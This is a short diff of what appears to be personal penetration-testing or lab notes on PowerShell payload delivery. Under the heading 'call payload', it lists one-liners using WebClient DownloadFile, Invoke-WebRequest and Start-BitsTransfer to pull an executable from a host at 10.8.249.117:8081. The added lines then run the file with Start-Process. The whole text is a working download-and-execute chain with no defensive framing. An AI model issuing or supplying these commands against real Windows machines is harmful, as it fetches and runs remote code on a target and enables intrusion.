@@ -18,13 +18,15 @@ create powershell in windows
  
  ## call payload
  
- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.249.117:8081/learn.exe','learn.exe')"
+ powershell -c "(New-Object System.Net.WebClient).Downloadfile('http://10.8.249.117:8081/learn2.exe','learn2.exe')"
  
  invoke-webrequest -Uri "http://10.8.249.117:8081/learn.exe"
  
 
 Start-BitsTransfer -Source "http://10.8.249.117:8081/learn.exe" -d "c:\users"
 
+run payload 
+powershell -c Start-Process "learn2.exe"
 
  
  
